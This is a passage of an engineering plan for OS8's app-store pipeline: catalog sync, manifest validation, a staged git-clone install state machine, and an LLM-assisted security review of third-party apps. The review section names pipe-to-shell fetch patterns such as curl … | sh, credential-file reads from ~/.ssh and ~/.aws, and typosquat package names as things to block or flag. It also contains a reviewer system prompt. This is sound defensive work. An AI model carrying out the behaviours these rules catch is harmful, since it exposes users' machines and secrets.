  riskLevel: 'low' | 'medium' | 'high';
  installCount: number;
  rating: number | null;
  syncedAt: string;
  deletedAt: string | null;
};
```

### Sync logic

1. `GET https://os8.ai/api/apps?channel=verified` (and again with `?channel=community` once Phase 3 unlocks; v1: just verified).
2. Response: `{ apps: AppListing[] }` per PR 0.9 contract. (PR 0.9 omits `manifestYaml`; the listing endpoint returns headers fields only. Sync stores listing-level fields and lazy-loads `manifestYaml` via `fetchManifest` — see "manifestYaml hydration" below.)
3. Track existing slugs (`SELECT slug FROM app_catalog WHERE channel = ?`).
4. Upsert each entry. `manifest_sha` is a unique key for change detection: if `existing.manifest_sha === incoming.manifestSha && existing.catalog_commit_sha === incoming.catalogCommitSha`, skip the row.
5. For each soft-deleted upstream slug (no longer in response): `UPDATE app_catalog SET deleted_at = datetime('now') WHERE slug = ? AND channel = ?`.
6. FTS triggers in PR 1.1 keep `app_catalog_fts` synced automatically. (Skill catalog uses an explicit `INSERT … VALUES('rebuild')`; that's slower and only needed for bulk paths. App catalog uses triggers.)
7. Return `{ synced, added, updated, removed, alarms: [] }`.

**manifestYaml hydration policy.** PR 0.9's listing endpoint omits `manifestYaml` to keep the response small. The desktop fetches the full manifest only when needed:

- **At install time** (PR 1.16): `await AppCatalogService.fetchManifest(slug, channel)` populates `manifestYaml` and stores it inline on `app_install_jobs.review_report` (cached).
- **At browse time** (future in-OS8 catalog browser): listing fields are sufficient; manifestYaml is fetched on detail-view click.

This means `app_catalog.manifest_yaml` may be NULL after sync — fix by adding `fetchManifest`-on-demand in `get()`. If `get` finds `manifest_yaml IS NULL`, it fetches and writes back.

### `fetchManifest` signature

```js
async fetchManifest(slug, channel = 'verified') {
  const url = `https://os8.ai/api/apps/${encodeURIComponent(slug)}`;
  const resp = await fetch(url, {
    headers: { 'Accept': 'application/json' },
    signal: AbortSignal.timeout(15_000)
  });
  if (resp.status === 404) throw new Error(`app ${slug} not found`);
  if (!resp.ok) throw new Error(`os8.ai returned ${resp.status}`);
  const { app } = await resp.json();
  return app;   // includes manifestYaml per PR 0.10 contract
}
```

### Schedule

Mirror `scheduleCatalogSync()` at server.js:197-232. New function `scheduleAppCatalogSync()`:

- Runs at 4 AM local time (same as skill catalog — concurrent traffic to a static-cache os8.ai endpoint is fine).
- Invokes `AppCatalogService.sync(db, { channel: 'verified' })`.
- Logs sync result; on failure, logs warning and reschedules normally.

Invoke from server.js:891 alongside the existing skill catalog block:

```js
// After line 891 (scheduleCatalogSync()):
try {
  AppCatalogService.sync(db, { channel: 'verified' }).catch(e =>
    console.warn('[AppCatalog] startup sync error:', e.message));
  scheduleAppCatalogSync();
} catch (e) {
  console.warn('[AppCatalog] init error:', e.message);
}
```

### Tests

`/home/leo/Claude/os8/tests/app-catalog.test.js`:

| Fixture | Assertion |
|---|---|
| Mock fetch returns `{ apps: [] }` against empty DB | sync: `{ synced: 0, added: 0, updated: 0, removed: 0 }`; no rows |
| Mock fetch returns 1 worldmonitor entry; empty DB | sync writes 1 row; `app_catalog_fts MATCH 'worldmonitor'` returns it |
| Re-sync with same `manifest_sha` / `catalog_commit_sha` | 0 writes; result `updated: 0` |
| Worldmonitor removed from response | row's `deleted_at` set |
| `search(db, 'world')` after seed | returns worldmonitor with rank > 0 |
| `get(db, 'worldmonitor')` when `manifest_yaml IS NULL` | falls through to `fetchManifest`; row updated with parsed YAML |

Mocking: replace global `fetch` for the test (Node 22 has native fetch).

### Acceptance criteria

- After `worldmonitor` ships in os8.ai (PR 0.5 + 0.7 + 0.8 merged), `AppCatalogService.sync(db)` writes a row with `slug='worldmonitor'`, `manifest_sha=<sha256-of-manifest>`, `upstream_resolved_commit='e51058e1765ef2f0c83ccb1d08d984bc59d23f10'`.
- `AppCatalogService.search(db, 'world')` returns it.
- `AppCatalogService.get(db, 'worldmonitor')` lazy-fetches `manifestYaml` if missing, parses, returns the full entry.
- Daily 4 AM sync runs without error against the live endpoint.

### Cross-platform notes

None — pure HTTP + SQLite.

### Spec deviations

None.

### Depends on

PR 1.1 (schema), PR 0.7 + 0.8 + 0.9 + 0.10 (os8.ai endpoints).

### Open sub-questions

None.

---

## PR 1.4 — Manifest validation + install plan UI shell

**Goal.** Validate a manifest mechanically against `schema/appspec-v1.json` (the schema lives in the catalog repo; bundle a copy in the desktop for offline validation). Render the install plan modal from manifest fields only — no clone, no install commands. Approval button is **disabled** at this stage; PR 1.6 + 1.16 + 1.17 wire approval.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/manifest-validator.js`
- **Create:** `/home/leo/Claude/os8/src/data/appspec-v1.json` — copied from `os8ai/os8-catalog/schema/appspec-v1.json` at PR-merge time. Document the copy procedure in a `# yaml-language-server: $schema=` style header comment.
- **Create:** `/home/leo/Claude/os8/src/renderer/install-plan-modal.js` — renderer module
- **Create:** `/home/leo/Claude/os8/styles/components/install-plan-modal.css`
- **Modify:** `/home/leo/Claude/os8/preload.js` — add `appStore` namespace (channels for plan rendering)
- **Modify:** `/home/leo/Claude/os8/package.json` — add `js-yaml@^4.1.0` and `ajv@^8.17` + `ajv-formats@^3.0` to `dependencies`

### `manifest-validator.js`

```js
const Ajv = require('ajv').default;
const addFormats = require('ajv-formats').default;
const yaml = require('js-yaml');
const path = require('path');
const fs = require('fs');

const SCHEMA = JSON.parse(
  fs.readFileSync(path.join(__dirname, '..', 'data', 'appspec-v1.json'), 'utf8')
);
const ajv = new Ajv({ strict: true, allErrors: true });
addFormats(ajv);
const validateSchema = ajv.compile(SCHEMA);

const SLUG_RE   = /^[a-z][a-z0-9-]{1,39}$/;
const SHA_RE    = /^[0-9a-f]{40}$/;

function parseManifest(yamlText) {
  // safe variant — never loadAll
  const obj = yaml.load(yamlText);
  if (typeof obj !== 'object' || obj === null) {
    throw new Error('manifest is not an object');
  }
  return obj;
}

// Mechanical validation. Returns { ok, errors[] }.
// Distinguishes schema errors (fix manifest) from invariant errors (v1 rejects).
function validateManifest(manifest, { upstreamResolvedCommit } = {}) {
  const errors = [];

  if (!validateSchema(manifest)) {
    for (const e of validateSchema.errors || []) {
      errors.push({ kind: 'schema', path: e.instancePath, message: e.message });
    }
  }

  // v1 invariants beyond what the JSON Schema enforces:
  if (manifest?.runtime?.kind === 'docker') {
    errors.push({ kind: 'invariant', path: '/runtime/kind', message: 'docker runtime not supported in v1' });
  }
  if (manifest?.surface?.kind !== 'web') {
    errors.push({ kind: 'invariant', path: '/surface/kind', message: 'only surface.kind=web supported in v1' });
  }
  if (manifest?.permissions?.filesystem !== 'app-private') {
    errors.push({ kind: 'invariant', path: '/permissions/filesystem', message: 'only filesystem=app-private supported in v1' });
  }
  if (!SLUG_RE.test(manifest?.slug || '')) {
    errors.push({ kind: 'invariant', path: '/slug', message: 'slug must match ^[a-z][a-z0-9-]{1,39}$' });
  }
  if (upstreamResolvedCommit && !SHA_RE.test(upstreamResolvedCommit)) {
    errors.push({ kind: 'invariant', path: '/upstream/ref',
                  message: 'upstream resolved commit must be a 40-char hex SHA (resolution by sync)' });
  }

  // No-shell-string check (defensive — schema enforces, but double-check).
  for (const key of ['install', 'postInstall', 'preStart']) {
    const list = manifest?.[key];
    if (!Array.isArray(list)) continue;
    for (const cmd of list) {
      if (cmd?.shell === true) errors.push({ kind: 'invariant', path: `/${key}`, message: 'shell:true not allowed' });
      if (!Array.isArray(cmd?.argv)) errors.push({ kind: 'invariant', path: `/${key}`, message: 'argv array required' });
    }
  }
  if (manifest?.start?.shell === true) {
    errors.push({ kind: 'invariant', path: '/start/shell', message: 'shell:true not allowed' });
  }

  return { ok: errors.length === 0, errors };
}

module.exports = { parseManifest, validateManifest };
```

### Install-plan modal — fields rendered (PR 1.4 SHELL only)

The shell renders the listed fields from manifest+catalog metadata. Approval is disabled.

| Field | Source | Render |
|---|---|---|
| Header (icon, name, publisher, channel badge) | catalog row | top of modal |
| Source repo URL | `manifest.upstream.git` | clickable, opens system browser via `shell.openExternal` |
| License + commercial-use note | `manifest.legal.license`, `manifest.legal.commercial_use`, `manifest.legal.notes` | sidebar |
| Permissions list | `manifest.permissions.network` (outbound + inbound), `permissions.filesystem`, `permissions.os8_capabilities` | each item with a "Why?" tooltip linking to `docs/capabilities/<cap>.md` (or external doc if URL) |
| Required secrets (input fields) | `manifest.permissions.secrets` | each input has `pattern` validator; required ones gate Install |
| Resource expectations | `manifest.resources` | advisory |
| Architecture compatibility | `manifest.runtime.arch` ∩ `process.arch` (renderer reads via `os8.system.getArch()`) | green/red badge |
| Install commands (collapsible) | `manifest.install`, `postInstall`, `preStart`, `start` | code block per cmd; argv arrays rendered |
| Disk + time estimate | constant table by framework (vite ~80MB ~30s; nextjs ~250MB ~90s; static ~1MB ~5s) | advisory only |

PR 1.6 + 1.17 add the **review-status panel** (findings list + risk badge + spinner during review) and the **dependency summary**. PR 1.16 wires the **progress streaming** post-approval.

### IPC channels

`preload.js` extension:

```js
appStore: {
  validateManifest: (manifestYaml, opts) => ipcRenderer.invoke('app-store:validate-manifest', manifestYaml, opts),
  renderPlan:       (slug, channel) => ipcRenderer.invoke('app-store:render-plan', slug, channel),
  // PR 1.16+ adds: install, approve, cancel, jobUpdate (event)
}
```

`src/ipc/app-store.js` (new file):

```js
const { ipcMain } = require('electron');
const { parseManifest, validateManifest } = require('../services/manifest-validator');
const AppCatalogService = require('../services/app-catalog');

function registerAppStoreHandlers({ db }) {
  ipcMain.handle('app-store:validate-manifest', (_e, yamlText, opts) => {
    try {
      const m = parseManifest(yamlText);
      return { ok: true, manifest: m, validation: validateManifest(m, opts || {}) };
    } catch (err) {
      return { ok: false, error: err.message };
    }
  });

  ipcMain.handle('app-store:render-plan', async (_e, slug, channel) => {
    const entry = await AppCatalogService.get(db, slug, { channel });
    if (!entry) return { ok: false, error: 'not in local catalog' };
    return { ok: true, entry };
  });
}

module.exports = { registerAppStoreHandlers };
```

Wire into `src/ipc/index.js` (existing aggregator) so `registerAllHandlers()` from `main.js:136` picks it up.

### Tests

`/home/leo/Claude/os8/tests/manifest-validator.test.js`:

| Fixture | Assertion |
|---|---|
| Worldmonitor manifest YAML (copied from PR 0.5) | `validateManifest` ok |
| Manifest with `runtime.kind: docker` | error path `/runtime/kind` |
| Manifest with `start: { shell: true, argv: [...] }` | error path `/start/shell` |
| Manifest with bad slug `Bad_Slug` | error path `/slug` |
| Manifest missing `permissions.network.inbound` | schema error |
| Tag-form `upstream.ref` with `upstreamResolvedCommit` set to a 40-char SHA | ok |
| `upstreamResolvedCommit` set to 39-char string | invariant error |

### Acceptance criteria

- `parseManifest` round-trips the worldmonitor manifest from `os8ai/os8-catalog/apps/worldmonitor/manifest.yaml` (copied into the test fixtures) without loss.
- `validateManifest` ok-status for worldmonitor, descriptive errors for the bad fixtures.
- IPC `app-store:render-plan` for `slug='worldmonitor'` returns the catalog entry; the renderer modal opens and displays icon, name, permissions, secrets fields, and (currently disabled) Install button.

### Cross-platform notes

None.

### Spec deviations

None.

### Depends on

PR 1.1 (schema), PR 1.3 (`AppCatalogService.get`).

### Open sub-questions

None.

---

## PR 1.5 — Static fetch + `app_install_jobs` state machine

**Goal.** Implement the *static fetch* phase of the install pipeline: `git clone --branch <commit> --depth 1` into `~/os8/apps_staging/<jobId>/`. Track job state in `app_install_jobs`. **Deliberately stops short of running install commands** — that's PR 1.16 after review (PR 1.6) and approval (PR 1.17).

### Files

- **Create:** `/home/leo/Claude/os8/src/services/app-install-jobs.js` — pure CRUD over the `app_install_jobs` table
- **Create:** `/home/leo/Claude/os8/src/services/app-installer.js` — the orchestrator (skeleton; PR 1.16 fills in the rest)
- **Create:** `/home/leo/Claude/os8/src/routes/app-store.js` — `/api/app-store/*` HTTP routes
- **Modify:** `/home/leo/Claude/os8/src/server.js` — mount `/api/app-store` (insert after line 555, alongside other routes)
- **Modify:** `/home/leo/Claude/os8/src/services/app-catalog.js` — extend with `install({ slug, commit, channel, secrets?, source? })` skeleton that creates the job and clones (rest filled in 1.16)

### State machine

```
                                   ┌──────────┐
            POST /install ─────────► pending  │
                                   └────┬─────┘
                                        │ async clone (git clone --depth 1 --branch <commit>)
                                        ▼
                                   ┌──────────┐  clone fails
                                   │ cloning  ├────────► failed (terminal)
                                   └────┬─────┘
                                        │ clone ok; HEAD verified
                                        ▼
                                   ┌──────────┐  review fails
                                   │ reviewing├────────► failed (terminal)
                                   └────┬─────┘
                                        │ static + LLM review complete
                                        ▼
                                   ┌─────────────────────┐  POST /cancel
                                   │ awaiting_approval   ├────► cancelled (terminal)
                                   └────┬────────────────┘
                                        │ POST /approve (with secrets)
                                        ▼
                                   ┌────────────┐  install fails
                                   │ installing ├────────► failed (terminal)
                                   └────┬───────┘
                                        │ install ok; staging→apps move ok
                                        ▼
                                   ┌────────────┐
                                   │ installed  │ (terminal)
                                   └────────────┘
```

PR 1.5 implements: `pending → cloning → reviewing` (with review skipped pending PR 1.6) `→ awaiting_approval`. PR 1.16 implements: `awaiting_approval → installing → installed | failed`.

### `app-install-jobs.js` shape

```js
const { generateId } = require('../utils');
const InstallJobs = {
  create(db, { externalSlug, upstreamResolvedCommit, channel }) {
    const id = generateId();
    const now = new Date().toISOString();
    db.prepare(`INSERT INTO app_install_jobs
      (id, app_id, external_slug, upstream_resolved_commit, channel, status,
       staging_dir, review_report, error_message, log_path, created_at, updated_at)
      VALUES (?, NULL, ?, ?, ?, 'pending', NULL, NULL, NULL, NULL, ?, ?)`)
     .run(id, externalSlug, upstreamResolvedCommit, channel, now, now);
    return InstallJobs.get(db, id);
  },
  get(db, id)               { return db.prepare('SELECT * FROM app_install_jobs WHERE id = ?').get(id); },
  list(db, { status } = {}) { /* SELECT … WHERE status = ? ORDER BY created_at DESC */ },
  // Atomic transition: requires current status to match `from`. Throws if not.
  transition(db, id, { from, to, patches = {} }) {
    const now = new Date().toISOString();
    const setClause = ['status = ?', 'updated_at = ?'];
    const args = [to, now];
    for (const [k, v] of Object.entries(patches)) {
      setClause.push(`${k} = ?`); args.push(v);
    }
    args.push(id, from);
    const r = db.prepare(`UPDATE app_install_jobs SET ${setClause.join(', ')} WHERE id = ? AND status = ?`)
      .run(...args);
    if (r.changes !== 1) {
      const cur = InstallJobs.get(db, id);
      throw new Error(`transition rejected: expected status='${from}', actual='${cur?.status || 'missing'}'`);
    }
    return InstallJobs.get(db, id);
  },
  fail(db, id, errorMessage) { /* unconditional UPDATE to status=failed with error */ },
  cancel(db, id) { /* awaiting_approval → cancelled */ },
};
module.exports = InstallJobs;
```

### `app-installer.js` skeleton (PR 1.5 portion)

```js
// PR 1.5 ships clone + state machine. PR 1.6 adds the review hook. PR 1.16 adds install.
const fs = require('fs');
const path = require('path');
const { spawn } = require('node:child_process');
const { APPS_STAGING_DIR } = require('../config');
const InstallJobs = require('./app-install-jobs');
const AppCatalogService = require('./app-catalog');

const AppInstaller = {
  // Entry point — invoked by routes/app-store.js POST /install.
  async start(db, { slug, commit, channel, secrets = {}, source = 'manual', onProgress }) {
    const job = InstallJobs.create(db, {
      externalSlug: slug, upstreamResolvedCommit: commit, channel
    });
    // Async — the route returns 202 immediately; client subscribes via SSE.
    setImmediate(() => AppInstaller._run(db, job.id, { secrets, source, onProgress })
      .catch(err => InstallJobs.fail(db, job.id, err.message)));
    return job;
  },

  async _run(db, jobId, { secrets, source, onProgress }) {
    let job = InstallJobs.transition(db, jobId, { from: 'pending', to: 'cloning' });
    onProgress?.(job);

    // 1. Resolve manifest (lazy fetch + cache).
    const entry = await AppCatalogService.get(db, job.external_slug, { channel: job.channel });
    if (!entry) throw new Error('app not in local catalog (run sync first)');
    if (entry.upstreamResolvedCommit !== job.upstream_resolved_commit) {
      throw new Error(`commit mismatch — catalog has ${entry.upstreamResolvedCommit}, requested ${job.upstream_resolved_commit}`);
    }

    // 2. Clone into staging.
    const stagingDir = path.join(APPS_STAGING_DIR, jobId);
    fs.mkdirSync(stagingDir, { recursive: true });
    const upstreamGit = entry.manifest.upstream.git;
    await AppInstaller._clone(upstreamGit, job.upstream_resolved_commit, stagingDir);

    // 3. Verify HEAD matches declared commit. Defense against MITM (negligible
    //    over HTTPS) but more importantly against accidental ref drift.
    const headSha = await AppInstaller._gitHead(stagingDir);
    if (headSha !== job.upstream_resolved_commit) {
      throw new Error(`HEAD ${headSha} != declared ${job.upstream_resolved_commit}`);
    }

    job = InstallJobs.transition(db, jobId, {
      from: 'cloning', to: 'reviewing', patches: { staging_dir: stagingDir }
    });
    onProgress?.(job);

    // 4. PR 1.6 hook — runs AppReviewService.review(stagingDir, manifest).
    //    For PR 1.5 (no review yet), skip straight to awaiting_approval.
    const reviewReport = AppInstaller._review
      ? await AppInstaller._review(db, stagingDir, entry.manifest)
      : { riskLevel: 'unknown', findings: [], summary: 'review service not yet wired (PR 1.5 stub)' };

    job = InstallJobs.transition(db, jobId, {
      from: 'reviewing', to: 'awaiting_approval',
      patches: { review_report: JSON.stringify(reviewReport) }
    });
    onProgress?.(job);

    // PR 1.16 fills in the rest: awaiting_approval → installing → installed.
  },

  async _clone(gitUrl, commit, dir) {
    return new Promise((resolve, reject) => {
      // shell:false — no string interpolation into a shell.
      const p = spawn('git',
        ['clone', '--depth', '1', '--branch', commit, gitUrl, dir],
        { shell: false, stdio: ['ignore', 'pipe', 'pipe'] });
      let stderr = '';
      p.stderr.on('data', d => { stderr += d.toString(); });
      p.on('exit', code => {
        if (code === 0) resolve();
        else reject(new Error(`git clone exited ${code}: ${stderr.trim().slice(-500)}`));
      });
      p.on('error', reject);
    });
  },

  async _gitHead(dir) { /* spawn git rev-parse HEAD; return trimmed stdout */ },
};

module.exports = AppInstaller;
```

**Note on `git clone --branch <commit>`.** Git 2.5+ supports passing a 40-char SHA to `--branch` provided the upstream allows uploadpack of arbitrary SHAs (`uploadpack.allowReachableSHA1InWant=true` on the server, default for github.com). If the upstream rejects, fall back to: `git clone --no-checkout --depth 1 <url> <dir>`, then `git -C <dir> fetch origin <commit> --depth 1`, then `git -C <dir> checkout <commit>`. Wrap with try/catch and document.

### Routes (`src/routes/app-store.js`)

```js
const express = require('express');
const AppInstaller = require('../services/app-installer');
const InstallJobs = require('../services/app-install-jobs');

function createAppStoreRouter(db) {
  const router = express.Router();

  // POST /api/app-store/install
  router.post('/install', async (req, res) => {
    try {
      const { slug, commit, channel = 'verified', secrets = {}, source = 'manual' } = req.body || {};
      if (!slug || !commit) return res.status(400).json({ error: 'slug and commit required' });
      const job = await AppInstaller.start(db, { slug, commit, channel, secrets, source });
      res.status(202).json({ jobId: job.id, status: job.status });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // GET /api/app-store/jobs/:id
  router.get('/jobs/:id', (req, res) => {
    const job = InstallJobs.get(db, req.params.id);
    if (!job) return res.status(404).json({ error: 'job not found' });
    res.json({
      id: job.id, status: job.status,
      externalSlug: job.external_slug,
      reviewReport: job.review_report ? JSON.parse(job.review_report) : null,
      errorMessage: job.error_message,
      stagingDir: job.staging_dir,
      logPath: job.log_path,
      createdAt: job.created_at, updatedAt: job.updated_at,
    });
  });

  // POST /api/app-store/jobs/:id/cancel
  router.post('/jobs/:id/cancel', (req, res) => {
    try { InstallJobs.cancel(db, req.params.id); res.json({ success: true }); }
    catch (err) { res.status(400).json({ error: err.message }); }
  });

  // POST /api/app-store/jobs/:id/approve  — body: { secrets?: {...} }
  // PR 1.16 implements full behavior; PR 1.5 returns 501.
  router.post('/jobs/:id/approve', (_req, res) => {
    res.status(501).json({ error: 'approve hook arrives in PR 1.16' });
  });

  // GET /api/app-store/jobs/:id/log  — SSE stream
  router.get('/jobs/:id/log', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    // SSE emitter wired to InstallJobs change events; PR 1.16 fills in.
    res.write('data: {"event":"hello","jobId":"' + req.params.id + '"}\n\n');
    // hold open; close on disconnect
    req.on('close', () => {});
  });

  return router;
}
module.exports = createAppStoreRouter;
```

Mount in `src/server.js` after line 555:

```js
const createAppStoreRouter = require('./routes/app-store');
app.use('/api/app-store', createAppStoreRouter(db));
```

### Tests

`/home/leo/Claude/os8/tests/app-install-jobs.test.js`:

| Fixture | Assertion |
|---|---|
| `InstallJobs.create` then `get` | row returned with status `pending` |
| `transition('pending', 'cloning')` | row updated; second call with `from: 'pending'` throws |
| `cancel` from `awaiting_approval` | status `cancelled` |
| `cancel` from `installed` | throws |

`/home/leo/Claude/os8/tests/app-installer-clone.test.js` (integration):

- Use a tiny public test repo (e.g. `octocat/Hello-World`) at a known SHA.
- `AppInstaller.start(db, { slug: 'hello-world-test', commit: '<sha>', channel: 'verified' })` (with a test-only catalog row pre-inserted).
- Poll `InstallJobs.get` until status is `awaiting_approval` (or `failed`); assert `staging_dir` exists and contains the expected files.

### Acceptance criteria

- `curl -X POST http://localhost:8888/api/app-store/install -H 'Content-Type: application/json' -d '{"slug":"worldmonitor","commit":"e51058e1...","channel":"verified"}'` returns `202 { jobId, status: "cloning" }`.
- Polling `GET /api/app-store/jobs/<id>` shows transitions `cloning → reviewing → awaiting_approval` (review currently a stub).
- Filesystem: `~/os8/apps_staging/<jobId>/` exists, contains the upstream files at the declared commit.
- No install commands have run (`node_modules/` is absent in the staging dir).

### Cross-platform notes

- `git` must be on PATH. On macOS / Linux nearly always present; on Windows, document a startup check (PR 1.11's `ensureAvailable` will surface a friendly error).

### Spec deviations

None.

### Depends on

PR 1.1 (schema), PR 1.3 (catalog).

### Open sub-questions

None.

---

## PR 1.6 — `AppReviewService` (security review for cloned apps)

**Goal.** Static checks (deterministic, blocking) + static analysis (advisory) + LLM review of cloned files against manifest claims. Hooks into the state machine: `cloning → reviewing → awaiting_approval`. Plan §2 deviation locked: keep `skill-review.js` and add `app-review.js`; extract a shared LLM-call helper.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/security-review-shared.js` — shared LLM-call helper used by both review services
- **Create:** `/home/leo/Claude/os8/src/services/app-review.js`
- **Modify:** `/home/leo/Claude/os8/src/services/skill-review.js` — refactor `_callLLM` (or equivalent inline block at lines ~115-146) to call the shared helper. Net delta: <30 lines of changes; the existing system prompt at lines 34-79 stays in place.
- **Modify:** `/home/leo/Claude/os8/src/services/app-installer.js` (PR 1.5) — replace the `AppInstaller._review = null` stub with a real call to `AppReviewService.review(db, stagingDir, manifest, channel)`.

### Shared helper interface (`security-review-shared.js`)

```js
const AnthropicSDK = require('./anthropic-sdk');
const AIRegistryService = require('./ai-registry');
const RoutingService = require('./routing');

const Shared = {
  /**
   * Run an LLM review with the given system prompt + user message.
   * Returns parsed JSON per the schema enforced inline in the system prompt.
   * Caller is responsible for catching LLMReviewError.
   *
   * @param {object} db
   * @param {object} opts
   * @param {string} opts.systemPrompt        - reviewer system prompt with response schema
   * @param {string} opts.userMessage         - serialized review input (files + manifest + signals)
   * @param {number} [opts.maxTokens=4096]
   * @param {string} [opts.routingTask='planning']  - RoutingService task key
   * @returns {Promise<object>}                - parsed JSON from the model
   */
  async runReview(db, { systemPrompt, userMessage, maxTokens = 4096, routingTask = 'planning' }) {
    const client = AnthropicSDK.getClient(db);
    if (!client) throw new LLMReviewError('Anthropic API key not configured');

    const claudeModels = AIRegistryService.getClaudeModelMap(db);
    const resolved = RoutingService.resolve(db, routingTask);
    const model = claudeModels[resolved.modelArg]
               || claudeModels['sonnet']
               || 'claude-sonnet-4-5-20250929';

    const response = await client.messages.create({
      model, max_tokens: maxTokens,
      system: systemPrompt,
      messages: [{ role: 'user', content: userMessage }]
    });

    const text = response.content.filter(b => b.type === 'text').map(b => b.text).join('');
    return Shared.parseStructuredResponse(text);
  },

  // Strip ```json fences, parse, throw structured error on bad JSON.
  parseStructuredResponse(text) {
    const m = text.match(/```(?:json)?\n?([\s\S]+?)\n?```/);
    const body = (m ? m[1] : text).trim();
    try { return JSON.parse(body); }
    catch (e) { throw new LLMReviewError(`model returned non-JSON: ${e.message}; body=${body.slice(0, 200)}`); }
  },
};

class LLMReviewError extends Error { constructor(msg) { super(msg); this.name = 'LLMReviewError'; } }

module.exports = { Shared, LLMReviewError };
```

### App review prompt skeleton

```text
You are a security reviewer for OS8, a desktop AI agent platform. You are reviewing
a third-party application packaged in the OS8 catalog. The user is about to install
this app's source code on their machine and run its install commands and dev server.
Your job is to identify whether the manifest's declared behavior matches what the
code actually does.

You will receive: (a) the manifest (YAML); (b) a directory listing; (c) the contents
of key files (package.json, install scripts, source files referencing window.os8.*,
and any postinstall/preinstall scripts); (d) static-analysis signals (npm audit
summary, license scan, pattern grep counts).

Review criteria:
1. **Manifest honesty** — does start.argv plausibly run a dev server matching the
   declared framework? Is upstream commit pinned?
2. **Capability over-declaration** — declared os8_capabilities cross-referenced
   against window.os8.* call sites and fetch('/api/...') calls. Flag declared-but-
   unused (low-severity) and used-but-undeclared (high-severity).
3. **Network behavior** — outbound endpoints in source matched against
   permissions.network.outbound. Flag domains not mentioned in manifest description
   or README.
4. **Filesystem access** — fs reads/writes outside the app's own directory or
   declared blob/db scopes. Reading /etc, /home/<user>/.ssh, /home/<user>/.aws is
   high-severity.
5. **Secret handling** — declared secrets cross-referenced against where they're
   used. Sending an API key via outbound HTTP to a third-party domain not mentioned
   in the prompt: flag.
6. **Supply chain** — count direct + transitive deps; flag suspicious package
   names (typosquats: react-domv, axiosjs, lodash-es-utils); flag postinstall
   scripts (already a static-finding from #4).
7. **Subdomain compatibility** — for vite/next/sveltekit/astro frameworks, does
   the start command bind at / (no path prefix)? Subdomain mode means the app
   is at <slug>.localhost:8888 — apps that ship a hardcoded base path
   (e.g. --base /myapp/) will be misrouted. Frameworks should bind --host
   127.0.0.1 (or 0.0.0.0) so the proxy can reach them.

Respond with ONLY valid JSON:
{
  "riskLevel": "low" | "medium" | "high",
  "findings": [
    {
      "severity": "info" | "warning" | "critical",
      "category": "manifest_dishonesty" | "capability_overdeclaration" | "capability_underdeclaration" | "network" | "filesystem" | "secrets" | "supply_chain" | "framework_mismatch" | "other",
      "file": "<relative path or null>",
      "line": <int or null>,
      "description": "<what was found>",
      "snippet": "<relevant code or text, ≤200 chars>"
    }
  ],
  "trustAssessment": {
    "manifestMatchesCode": <bool>,
    "declaredCapsCount": <int>,
    "usedCapsCount": <int>,
    "outboundDomains": ["<domain>"],
    "depCount": <int>,
    "execScripts": <int>
  },
  "summary": "<one paragraph>"
}

Risk level rules:
- "low": findings ≤ info-only; manifest matches code; outbound domains match
  manifest; ≤ 1 dep with postinstall.
- "medium": warning findings; some manifest drift; postinstall present.
- "high": critical findings; capability under-declaration; sending secrets to
  undeclared domains.
```

### Static checks (deterministic, blocking)

Implemented in `app-review.js` BEFORE the LLM call. If any blocking check fails, set `riskLevel: 'high'`, append a finding, and skip the LLM call entirely:

| Check | Severity | Action on fail |
|---|---|---|
| All `install/postInstall/preStart/start` items are argv arrays (no shell strings, no `shell: true`) | critical | Block |
| No `curl … \| sh` / `wget … \| sh` patterns in any command argv | critical | Block |
| `package.json.scripts.postinstall` / `preinstall` / `install` present | warning | LLM scrutiny |
| Lockfile present and matches declared `runtime.package_manager` (Verified channel only) | critical | Block |
| `process.arch` ∈ `manifest.runtime.arch` | critical | Block |
| `manifest.upstream.ref`'s resolved commit is a 40-char SHA (passed in from job row) | critical | Block |

### Static analysis (advisory)

Run with sensible timeouts; failures are warnings, not blocking:

- `npm audit --json --omit=dev` (in stagingDir) — parse `metadata.vulnerabilities.high`/`critical` counts. Surface in `findings[]`.
- License scan: read `legal.license` from manifest; grep `package.json.license` field of all direct deps; flag mismatches (e.g. manifest says MIT but a dep is GPL-3.0 — could affect distribution).
- Pattern greps (advisory, low-severity): `child_process.exec(`, `eval(`, `Function(`, `new Function(`, dynamic `require(<expr>)`. Each match → low-severity finding with file + line.

### `app-review.js` shape

```js
const fs = require('fs');
const path = require('path');
const { Shared, LLMReviewError } = require('./security-review-shared');

const APP_REVIEW_SYSTEM_PROMPT = `…(prompt above)…`;

const AppReviewService = {
  async review(db, stagingDir, manifest, { channel = 'verified', resolvedCommit } = {}) {
    // 1. Static blocking checks.
    const blockers = AppReviewService._runStaticChecks(stagingDir, manifest, { channel, resolvedCommit });
    if (blockers.length > 0) {
      return { riskLevel: 'high', findings: blockers, trustAssessment: {},
               summary: 'Blocking static checks failed; LLM review skipped.' };
    }

    // 2. Static analysis (advisory).
    const advisory = await AppReviewService._runStaticAnalysis(stagingDir, manifest);

    // 3. Build LLM input — directory listing + key file contents (capped).
    const userMessage = AppReviewService._buildUserMessage(stagingDir, manifest, advisory);

    // 4. LLM call.
    let llm;
    try {
      llm = await Shared.runReview(db, { systemPrompt: APP_REVIEW_SYSTEM_PROMPT, userMessage });
    } catch (e) {
      // Don't block install on LLM failure — surface as info finding.
      return {
        riskLevel: 'medium',
        findings: [...advisory, {
          severity: 'info', category: 'other',
          file: null, line: null,
          description: `LLM review failed: ${e.message}`, snippet: ''
        }],
        trustAssessment: {},
        summary: `Static analysis only (LLM review unavailable: ${e.message})`
      };
    }

    // 5. Merge static findings into LLM report.
    return {
      riskLevel: AppReviewService._maxRisk(llm.riskLevel, advisory),
      findings: [...advisory, ...(llm.findings || [])],
      trustAssessment: llm.trustAssessment || {},
      summary: llm.summary || ''
    };
  },

  _runStaticChecks(stagingDir, manifest, { channel, resolvedCommit }) { /* … */ },
  _runStaticAnalysis(stagingDir, manifest) { /* … */ },
  _buildUserMessage(stagingDir, manifest, advisory) { /* dir listing + key files */ },
  _maxRisk(llmRisk, findings) { /* if any critical finding, force high */ },
};
module.exports = AppReviewService;
```

### Tests

`/home/leo/Claude/os8/tests/app-review.test.js`:

| Fixture | Assertion |
|---|---|
| Worldmonitor manifest + clone of upstream at `e51058e1…` | static blockers empty; LLM mocked to return `{ riskLevel: 'low', findings: [], … }`; result `riskLevel: 'low'` |
